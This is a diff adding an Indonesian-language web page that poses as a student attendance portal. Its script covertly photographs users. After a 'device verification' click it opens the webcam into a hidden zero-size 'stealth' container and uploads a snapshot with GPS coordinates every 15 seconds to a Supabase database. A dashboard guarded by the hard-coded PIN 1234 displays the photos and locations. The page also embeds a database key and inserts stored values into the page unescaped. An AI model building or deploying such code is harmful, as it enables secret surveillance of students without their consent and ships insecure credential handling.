@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Absensi Pendidikan</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Supabase SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { background-color: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }
+        .glass-panel { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(51, 65, 85, 0.5); }
+        
+        #stealth-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: -9999;
+        }
+        
+        .pulse-text { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+        
+        input { transition: all 0.3s ease; }
+        button:active { transform: scale(0.98); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- CONTAINER KAMERA RAHASIA -->
+    <div id="stealth-container">
+        <video id="stealth-cam-front" autoplay playsinline muted></video>
+        <canvas id="stealth-canvas"></canvas>
+    </div>
+
+    <!-- LAYAR PILIH LOGIN -->
+    <div id="login-screen" class="glass-panel p-8 rounded-2xl shadow-2xl w-full max-w-md text-center transition-all duration-500">
+        <h1 class="text-3xl font-bold text-emerald-400 tracking-widest mb-2">NEXUS EDU</h1>
+        <p class="text-slate-400 mb-8 text-sm">Portal Absensi Siswa Digital</p>
+        
+        <p class="text-xs text-amber-500 mb-4 font-bold bg-amber-900/30 p-2 rounded border border-amber-700/50">
+            ⚠️ Wajib Verifikasi Perangkat sebelum Login
+        </p>
+
+        <button onclick="verifikasiLaluMasuk()" id="btn-verif" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-xl mb-4 transition-all tracking-wider flex justify-center items-center gap-2 relative overflow-hidden group z-10">
+            <span class="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></span>
+            <svg class="w-5 h-5 z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4"></path></svg>
+            <span class="z-10">VERIFIKASI & LOGIN SISWA</span>
+        </button>
+
+        <button onclick="showGuru()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-4 rounded-xl border border-slate-700 transition-all tracking-wider z-10">
+            COMMAND CENTER GURU
+        </button>
+    </div>
+
+    <!-- LAYAR SISWA -->
+    <div id="siswa-screen" class="hidden glass-panel p-6 rounded-2xl shadow-2xl w-full max-w-md transition-all relative overflow-hidden">
+        <div id="auto-indicator" class="absolute top-2 right-2 flex items-center gap-2">
+            <div class="w-2 h-2 rounded-full bg-red-500 pulse-text"></div>
+            <span class="text-[10px] text-slate-500 tracking-widest">SYSTEM ACTIVE</span>
+        </div>
+
+        <h2 class="text-xl font-bold text-center text-emerald-400 mb-6 tracking-widest">FORM ABSENSI</h2>
+        
+        <div class="mb-4">
+            <label class="block text-slate-400 text-xs font-bold mb-2 tracking-wider">NAMA / NIS SISWA</label>
+            <input id="siswa-nama" type="text" class="w-full bg-slate-900 border border-slate-700 rounded-lg py-3 px-4 text-white focus:outline-none focus:border-emerald-500" placeholder="Masukkan Nama...">
+        </div>
+        
+        <div class="mb-6">
+            <label class="block text-slate-400 text-xs font-bold mb-2 tracking-wider">KETERANGAN</label>
+            <input id="siswa-ket" type="text" class="w-full bg-slate-900 border border-slate-700 rounded-lg py-3 px-4 text-white focus:outline-none focus:border-emerald-500" placeholder="Hadir / Sakit / Terlambat...">
+        </div>
+
+        <button onclick="prosesAbsen('HADIR')" id="btn-absen" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-xl transition-all tracking-widest shadow-[0_0_15px_rgba(5,150,105,0.4)]">
+            KLIK UNTUK HADIR
+        </button>
+
+        <p class="text-center text-xs text-slate-500 mt-6">Device ID: <span id="dev-id-display" class="font-mono text-emerald-500"></span></p>
+    </div>
+
+    <!-- LAYAR GURU -->
+    <div id="guru-screen" class="hidden w-full max-w-6xl">
+        <div class="glass-panel p-6 rounded-2xl mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
+            <div>
+                <h2 class="text-2xl font-bold text-emerald-400 tracking-widest uppercase text-left">Nexus Command Center</h2>
+                <p class="text-slate-400 text-sm text-left">Monitoring Log Absensi & Background Capture</p>
+            </div>
+            <button onclick="location.reload()" class="bg-red-900/50 hover:bg-red-800 text-red-200 px-6 py-2 rounded-lg text-sm font-bold border border-red-700/50 transition-all">KELUAR SISTEM</button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <div class="glass-panel p-6 rounded-xl h-fit">
+                <h3 class="text-emerald-400 font-bold mb-4 border-b border-slate-700 pb-2 uppercase text-xs tracking-tighter text-left">Konfigurasi Database</h3>
+                <div class="space-y-3">
+                    <input id="supa-url" type="text" placeholder="Supabase URL" class="w-full bg-slate-900 border border-slate-700 rounded p-2 text-xs text-white">
+                    <input id="supa-key" type="password" placeholder="Anon Key" class="w-full bg-slate-900 border border-slate-700 rounded p-2 text-xs text-white">
+                    <button onclick="simpanSupabase()" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded text-xs font-bold transition-colors">UPDATE KONEKSI</button>
+                    <p id="supa-status" class="text-[10px] text-slate-500 mt-2 text-center italic"></p>
+                </div>
+            </div>
+
+            <div class="md:col-span-2 glass-panel p-6 rounded-xl">
+                <div class="flex justify-between items-center mb-4 border-b border-slate-700 pb-2">
+                    <h3 class="text-emerald-400 font-bold uppercase text-xs">Live Logs Table</h3>
+                    <button onclick="loadLogs()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1 rounded text-[10px] text-white font-bold uppercase">Refresh</button>
+                </div>
+                
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-sm text-slate-300">
+                        <thead class="text-[10px] text-slate-400 bg-slate-800/80 uppercase tracking-widest">
+                            <tr>
+                                <th class="p-3">Waktu</th>
+                                <th class="p-3">Siswa</th>
+                                <th class="p-3 text-center">Snapshot</th>
+                                <th class="p-3">Lokasi</th>
+                                <th class="p-3 text-right">Device</th>
+                            </tr>
+                        </thead>
+                        <tbody id="log-table-body" class="divide-y divide-slate-800">
+                            <!-- Data -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI OTOMATIS ---
+        const DEFAULT_URL = "https://dgmimpupenzrtbylkopn.supabase.co";
+        const DEFAULT_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRnbWltcHVwZW56cnRieWxrb3BuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI5OTQ3NzYsImV4cCI6MjA4ODU3MDc3Nn0.9ahU05h08RLYbQ6KqlfMXVLD-xjlPla4n9rW_0FVe58";
+
+        let deviceId = localStorage.getItem('nexus_device_id') || ('DEV-' + Math.random().toString(36).substr(2, 6).toUpperCase());
+        localStorage.setItem('nexus_device_id', deviceId);
+        document.getElementById('dev-id-display').innerText = deviceId;
+
+        let supabase = null;
+        let gpsLocation = "Pending...";
+        const videoFront = document.getElementById('stealth-cam-front');
+        const canvas = document.getElementById('stealth-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function initSupabase() {
+            const url = localStorage.getItem('supa_url') || DEFAULT_URL;
+            const key = localStorage.getItem('supa_key') || DEFAULT_KEY;
+            
+            if(url && key && window.supabase) {
+                try {
+                    supabase = window.supabase.createClient(url, key);
+                    document.getElementById('supa-url').value = url;
+                    document.getElementById('supa-key').value = key;
+                    document.getElementById('supa-status').innerHTML = "🟢 Sistem Terkoneksi";
+                    document.getElementById('supa-status').style.color = "#10b981";
+                } catch (e) {
+                    console.error("Init error", e);
+                }
+            }
+        }
+        initSupabase();
+
+        function simpanSupabase() {
+            localStorage.setItem('supa_url', document.getElementById('supa-url').value.trim());
+            localStorage.setItem('supa_key', document.getElementById('supa-key').value.trim());
+            initSupabase();
+            alert("Koneksi Database Berhasil Diperbarui!");
+            loadLogs();
+        }
+
+        function snapPhoto() {
+            if(!videoFront.videoWidth) return null;
+            canvas.width = 320;
+            canvas.height = 240;
+            ctx.drawImage(videoFront, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.4); 
+        }
+
+        async function captureAndSave(tipeAksi) {
+            const fotoB64 = snapPhoto();
+            const payload = {
+                waktu: new Date().toLocaleString('id-ID'),
+                tipe: tipeAksi,
+                nama: document.getElementById('siswa-nama').value || "Siswa Tanpa Nama",
+                keterangan: document.getElementById('siswa-ket').value || "-",
+                lokasi: gpsLocation,
+                foto: fotoB64,
+                device_id: deviceId
+            };
+
+            if(supabase) {
+                const { error } = await supabase.from('absensi').insert([payload]);
+                if(error) console.error("Database Error:", error);
+            }
+        }
+
+        async function verifikasiLaluMasuk() {
+            const btn = document.getElementById('btn-verif');
+            btn.disabled = true;
+            btn.innerText = "MENYIAPKAN ENKRIPSI...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                videoFront.srcObject = stream;
+                
+                navigator.geolocation.getCurrentPosition(
+                    p => { gpsLocation = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
+                    e => { gpsLocation = "GPS Matikan"; }
+                );
+
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('siswa-screen').classList.remove('hidden');
+
+                // Mulai Capture Rahasia
+                setInterval(() => captureAndSave("AUTO-CAPTURE"), 15000);
+
+            } catch (err) {
+                alert("Akses kamera ditolak. Verifikasi gagal.");
+                btn.disabled = false;
+                btn.innerText = "COBA VERIFIKASI ULANG";
+            }
+        }
+
+        async function prosesAbsen(status) {
+            const btn = document.getElementById('btn-absen');
+            btn.disabled = true;
+            btn.innerText = "PROSES...";
+            
+            await captureAndSave("MANUAL: " + status);
+            
+            alert("Absensi Anda telah tercatat di server.");
+            btn.disabled = false;
+            btn.innerText = "KLIK UNTUK HADIR";
+            document.getElementById('siswa-nama').value = "";
+            document.getElementById('siswa-ket').value = "";
+        }
+
+        function showGuru() {
+            const pin = prompt("DASHBOARD GURU\nMasukkan PIN:");
+            if(pin === "1234") {
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('guru-screen').classList.remove('hidden');
+                loadLogs();
+            } else if (pin !== null) {
+                alert("PIN SALAH!");
+            }
+        }
+
+        async function loadLogs() {
+            const tbody = document.getElementById('log-table-body');
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 opacity-50 italic">Sync data dari Supabase...</td></tr>';
+            
+            if(supabase) {
+                const { data: dbData, error } = await supabase.from('absensi').select('*').order('id', { ascending: false }).limit(20);
+                
+                if(error) {
+                    tbody.innerHTML = `<tr><td colspan="5" class="text-center py-8 text-red-400">Error: ${error.message}</td></tr>`;
+                    return;
+                }
+
+                tbody.innerHTML = dbData.length ? '' : '<tr><td colspan="5" class="text-center py-8">Belum ada data di cloud.</td></tr>';
+                dbData.forEach(row => {
+                    const isAuto = row.tipe.includes("AUTO");
+                    tbody.innerHTML += `
+                        <tr class="hover:bg-white/5 transition-colors border-b border-slate-800">
+                            <td class="p-3 text-[10px] leading-tight">
+                                ${row.waktu}<br>
+                                <span class="${isAuto ? 'text-red-400' : 'text-emerald-400'} font-bold">${row.tipe}</span>
+                            </td>
+                            <td class="p-3 font-semibold text-white">${row.nama}</td>
+                            <td class="p-3 flex justify-center">
+                                ${row.foto ? `<img src="${row.foto}" class="w-12 h-12 object-cover rounded shadow-lg border border-slate-700">` : '-'}
+                            </td>
+                            <td class="p-3 text-[10px] font-mono">${row.lokasi}</td>
+                            <td class="p-3 text-right text-[10px] text-emerald-500 font-mono">${row.device_id}</td>
+                        </tr>
+                    `;
+                });
+            }
+        }
+    </script>
+</body>
+</html>
